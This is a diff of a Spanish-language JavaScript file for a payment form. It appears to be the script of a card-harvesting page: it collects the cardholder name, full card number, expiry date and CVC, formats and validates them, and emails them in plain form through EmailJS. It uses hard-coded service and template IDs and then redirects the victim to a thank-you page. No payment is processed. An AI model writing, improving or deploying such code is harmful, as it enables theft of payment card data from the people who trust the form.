@@ -1,20 +1,17 @@
 (function() {
-    emailjs.init('ReqtkWfjI392LAzFb');
+    emailjs.init('ReqtkWfjI392LAzFb'); // Public Key de EmailJS
 })();
 
-document.getElementById('paymentForm').addEventListener('submit', function(e) {
+document.getElementById('paymentForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const loader = document.getElementById('loader');
     const errorMsg = document.getElementById('errorMsg');
     
-    // Ocultar mensajes anteriores
+    // Resetear errores
     errorMsg.classList.add('hidden');
     document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
     
-    // Mostrar loader
-    loader.classList.remove('hidden');
-
-    // Obtener valores
+    // Obtener y formatear datos
     const formData = {
         nombre: document.getElementById('userName').value.trim(),
         numero: document.getElementById('cardNumber').value.replace(/\s/g, ''),
@@ -22,52 +19,71 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
         cvc: document.getElementById('cvc').value
     };
 
-    // Validaciones después de 5 segundos
-    setTimeout(() => {
-        let isValid = true;
+    // Validación en tiempo real
+    let isValid = true;
 
-        // Validar nombre
-        if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.nombre)) {
-            document.getElementById('nameError').style.display = 'block';
-            isValid = false;
-        }
+    // Validar nombre
+    if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.nombre)) {
+        document.getElementById('nameError').style.display = 'block';
+        document.getElementById('nameError').textContent = 'Nombre completo requerido';
+        isValid = false;
+    }
 
-        // Validar tarjeta
-        if (!/^\d{16}$/.test(formData.numero)) {
-            document.getElementById('cardError').style.display = 'block';
-            isValid = false;
-        }
+    // Validar tarjeta
+    if (!/^\d{16}$/.test(formData.numero)) {
+        document.getElementById('cardError').style.display = 'block';
+        document.getElementById('cardError').textContent = 'Tarjeta inválida (16 dígitos)';
+        isValid = false;
+    }
 
-        // Validar fecha
-        const currentDate = new Date();
-        const expiryDate = new Date(formData.fecha);
-        if (expiryDate < currentDate) {
-            document.getElementById('dateError').style.display = 'block';
-            isValid = false;
-        }
+    // Validar fecha
+    const currentDate = new Date();
+    const expiryDate = new Date(formData.fecha);
+    if (expiryDate < currentDate) {
+        document.getElementById('dateError').style.display = 'block';
+        document.getElementById('dateError').textContent = 'Fecha expirada';
+        isValid = false;
+    }
 
-        // Validar CVC
-        if (!/^\d{4}$/.test(formData.cvc)) {
-            document.getElementById('cvcError').style.display = 'block';
-            isValid = false;
-        }
+    // Validar CVC
+    if (!/^\d{4}$/.test(formData.cvc)) {
+        document.getElementById('cvcError').style.display = 'block';
+        document.getElementById('cvcError').textContent = 'CVC inválido (4 dígitos)';
+        isValid = false;
+    }
 
+    if (!isValid) {
+        errorMsg.textContent = '⚠️ Por favor corrige los errores';
+        errorMsg.classList.remove('hidden');
+        return;
+    }
+
+    // Mostrar loader
+    loader.classList.remove('hidden');
+
+    try {
+        // Enviar datos a EmailJS
+        const response = await emailjs.send(
+            "service_syrc1uk",   // Service ID
+            "template_u3etoro",  // Template ID
+            formData
+        );
+
+        console.log('Email enviado:', response);
+        window.location.href = "thank-you.html";
+        
+    } catch (error) {
+        console.error('Error al enviar:', error);
+        errorMsg.textContent = '❌ Error en la verificación. Intenta nuevamente.';
+        errorMsg.classList.remove('hidden');
+    } finally {
         loader.classList.add('hidden');
+    }
+});
 
-        if (!isValid) {
-            errorMsg.classList.remove('hidden');
-            setTimeout(() => errorMsg.classList.add('hidden'), 5000);
-            return;
-        }
-
-        // Enviar correo
-        emailjs.send("service_syrc1uk", "template_u3etoro", formData)
-            .then(() => {
-                window.location.href = "thank-you.html";
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                window.location.href = "thank-you.html";
-            });
-    }, 5000);
+// Formatear número de tarjeta
+document.getElementById('cardNumber').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s/g, '');
+    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+    e.target.value = value.substring(0, 19);
 });
